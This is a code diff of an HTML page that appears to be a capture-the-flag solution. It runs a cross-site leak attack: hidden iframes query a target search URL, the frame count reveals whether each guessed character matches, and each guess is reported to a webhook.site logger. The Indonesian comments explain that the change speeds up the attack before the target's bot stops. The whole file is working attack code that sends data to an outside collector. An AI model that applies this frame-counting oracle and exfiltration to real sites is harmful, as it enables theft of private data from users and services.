@@ -4,26 +4,30 @@
     <script>
         const TARGET = "https://wonder.cbd2026.cloud/search?q=";
         const LOGGER = "https://webhook.site/fb0f12dc-6949-4193-ac04-768d43746e00";
-        const ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789_}";
+        
+        // Alfabet lengkap: Huruf Kecil, Huruf Besar, Angka, dan Simbol Umum
+        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@-}"; 
 
         async function check(q) {
             return new Promise(resolve => {
                 const ifr = document.createElement('iframe');
-                ifr.src = `${TARGET}${encodeURIComponent(q)}&cb=${Math.random()}`;
+                ifr.src = `${TARGET}${encodeURIComponent(q)}`;
                 ifr.style.display = "none";
                 document.body.appendChild(ifr);
+                
                 setTimeout(() => {
                     const isMatch = ifr.contentWindow.length > 0;
                     document.body.removeChild(ifr);
                     resolve(isMatch);
-                }, 1500); // Delay 1.5 detik per burst
+                }, 800); // Dipercepat ke 800ms agar lebih banyak karakter tertebak sebelum bot mati
             });
         }
 
         async function solve(current) {
-            fetch(`${LOGGER}?searching=${current}`);
+            // Beri tahu kita lagi nyari apa sekarang
+            fetch(`${LOGGER}?searching_at=${current}`);
             
-            // Mengecek 10 karakter sekaligus dalam satu waktu
+            // Cek 10 karakter sekaligus secara paralel
             for (let i = 0; i < ALPHABET.length; i += 10) {
                 const chunk = ALPHABET.slice(i, i + 10).split('');
                 const results = await Promise.all(chunk.map(c => check(current + c)));
@@ -39,8 +43,8 @@
             }
         }
 
-        fetch(`${LOGGER}?msg=FAST_ATTACK_STARTED`);
-        solve("cbd{"); 
+        // Jalankan!
+        solve("cbd{");
     </script>
 </body>
 </html>
